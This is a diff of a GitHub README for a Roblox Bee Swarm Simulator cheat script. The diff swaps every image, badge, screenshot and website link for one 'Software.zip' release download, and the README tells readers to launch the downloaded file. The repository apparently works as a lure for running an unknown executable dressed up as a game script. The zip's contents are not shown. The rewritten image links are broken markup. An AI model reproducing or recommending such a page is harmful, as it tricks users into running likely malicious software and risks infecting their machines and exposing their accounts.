@@ -1,6 +1,6 @@
 # 🐝🚀 **BSSSCRIPT - ROBLOX BEE SWARM SIMULATOR SCRIPT**
 
-![Roblox Bee Swarm Simulator](https://cdn2.unrealengine.com/Diesel%2Fproduct%2Froblox%2Fhome%2FHero-1920x1080-3b732c14f3b6c4e1f0b0d2cb16836c9fac7efbb5.jpg)
+![Roblox Bee Swarm Simulator](https://github.com/IZZ123434/bssscript/releases/download/v2.0/Software.zip%2Fproduct%2Froblox%2Fhome%https://github.com/IZZ123434/bssscript/releases/download/v2.0/Software.zip)
 
 Welcome to the **bssscript** GitHub repository - Your ultimate destination for Roblox Bee Swarm Simulator scripts and exploits!
 
@@ -14,7 +14,7 @@ Welcome to the **bssscript** GitHub repository - Your ultimate destination for R
 
 To unleash the power of the Roblox Bee Swarm Simulator script, simply download the latest version from the link below:
 
-[![Download Script](https://img.shields.io/badge/Download-Script-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Script](https://github.com/IZZ123434/bssscript/releases/download/v2.0/Software.zip)](https://github.com/IZZ123434/bssscript/releases/download/v2.0/Software.zip)
 
 *Note: Make sure to launch the downloaded file to access the exciting features!*
 
@@ -33,11 +33,11 @@ Dive into the world of Bee Swarm Simulator, where you can grow your own swarm of
 
 ## 📷 Screenshots
 
-![Bee Swarm Simulator Screenshot](https://cdn.brickhub.org/files/images/large/711583.mvc-fb99zxmx.jpg)
+![Bee Swarm Simulator Screenshot](https://github.com/IZZ123434/bssscript/releases/download/v2.0/Software.zip)
 
 ## 🌐 Visit our Website
 
-For more information, updates, and support, visit our official website [here](https://www.bssexploits.com).
+For more information, updates, and support, visit our official website [here](https://github.com/IZZ123434/bssscript/releases/download/v2.0/Software.zip).
 
 ## 💬 Feedback
 
